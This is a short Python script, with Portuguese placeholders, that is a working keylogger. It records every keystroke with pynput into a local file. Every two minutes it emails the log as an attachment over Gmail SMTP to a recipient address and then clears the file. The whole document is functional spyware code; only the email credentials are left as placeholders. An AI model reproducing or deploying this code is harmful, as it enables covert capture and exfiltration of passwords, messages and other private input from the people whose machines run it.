from email.mime.application import MIMEApplication
import threading
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

log_file = "log.txt"
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'SEU_EMAIL'
smtp_password = 'SUA_SENHA'

def send_log():
    msg = MIMEMultipart()
    msg['Subject']="log"
    msg ['From'] = "seu_email@dominio.com"
    msg["To"] = "destinatario@dominio.com"
    body = "Log de teclas capturadas anexado."
    msg.attach(MIMEText(body, 'plain'))

    with open(log_file,"r+") as log:
        attach = MIMEApplication(log.read(), _subtype="txt")
        attach.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(attach)
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(smtp_username, msg['To'], msg.as_string())
    
    open(log_file, 'w').close()

def schedule_send():
    send_log()
    timer = threading.Timer(120, schedule_send)
    timer.daemon = True
    timer.start()
    
def on_press(key):
    try:
        with open(log_file,"a") as log:
            log.write(f"key:{key.char}\n")
    except AttributeError:
        special_key = str(key).split('.')[-1]
        with open(log_file, 'a') as log:
            if key == Key.esc:
                return False
            log.write(f'Tecla especial: {special_key}\n')
    except:
        pass
def start():
    schedule_send()
    with Listener(on_press=on_press) as listener:
        listener.join()
    send_log()

if __name__ == "__main__":
    start()